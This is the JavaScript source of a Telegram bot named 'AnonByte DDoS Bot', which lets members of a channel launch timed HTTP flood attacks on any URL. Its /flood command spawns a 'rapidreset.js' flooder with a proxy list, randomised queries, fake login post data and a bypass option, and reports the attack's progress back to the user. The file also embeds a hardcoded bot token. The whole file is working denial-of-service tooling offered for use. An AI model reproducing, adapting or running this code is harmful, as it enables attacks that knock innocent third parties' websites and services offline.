const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');

const token = '7391044972:AAFZhbYbAgLkHfmnPrIE_U0O3tBclUPRXZs'; // Replace with your Telegram Bot token
const requiredChannel = '@ByteHammer'; // Required channel username

const bot = new TelegramBot(token, { polling: true });

let isRunning = false;
let currentUser = null;
let processRef = null;
let currentTarget = null;
let floodStartTime = null;

// /start command
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id,
    `Welcome to AnonByte DDoS Bot!\n\nJoin our channel ${requiredChannel} to use this bot.\n\nCommands:\n/flood <url> <time>\n/ongoing`);
});

// /flood <url> <time>
bot.onText(/\/flood (.+) (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const time = parseInt(match[2]);

  // Check membership
  try {
    const member = await bot.getChatMember(requiredChannel, userId);
    if (['left', 'kicked'].includes(member.status)) {
      return bot.sendMessage(chatId, `AnonByte: You must join ${requiredChannel} to use /flood.`);
    }
  } catch (err) {
    return bot.sendMessage(chatId, `AnonByte: Couldn't verify your channel join. Make sure you're in ${requiredChannel}.`);
  }

  if (time > 60) {
    return bot.sendMessage(chatId, `AnonByte: Maximum allowed time is 60 seconds.`);
  }

  if (isRunning) {
    return bot.sendMessage(chatId, `AnonByte: Flood already running by user ID ${currentUser}. Use /ongoing to view status.`);
  }

  const args = [
    'rapidreset.js', 'GET', `${url}?q=%RAND%`, '61', '64', '90', 'c.txt',
    '--query', '1',
    '--cookie', 'uh=good',
    '--delay', '0',
    '--bfm', 'true',
    '--referer', 'rand',
    '--postdata', 'user=f&pass=%RAND%',
    '--debug',
    '--randrate',
    '--full'
  ];

  try {
    processRef = spawn('node', args);
    isRunning = true;
    currentUser = userId;
    currentTarget = url;
    floodStartTime = Date.now();

    bot.sendMessage(chatId, `AnonByte: Flood started on:\n${url}\nFor ${time} seconds.`);

    processRef.on('exit', () => {
      isRunning = false;
      currentUser = null;
      currentTarget = null;
      floodStartTime = null;
      processRef = null;
      bot.sendMessage(chatId, `AnonByte: Flood completed.`);
    });

    setTimeout(() => {
      if (processRef) processRef.kill('SIGINT');
    }, time * 1000);
  } catch (err) {
    isRunning = false;
    bot.sendMessage(chatId, `AnonByte: Failed to start flood. Error: ${err.message}`);
  }
});

// /ongoing
bot.onText(/\/ongoing/, (msg) => {
  if (!isRunning) {
    return bot.sendMessage(msg.chat.id, `AnonByte: No flood is currently running.`);
  }

  const duration = Math.floor((Date.now() - floodStartTime) / 1000);
  bot.sendMessage(msg.chat.id,
    `AnonByte: Flood in progress...\nURL: ${currentTarget}\nUser ID: ${currentUser}\nElapsed: ${duration} sec`);
});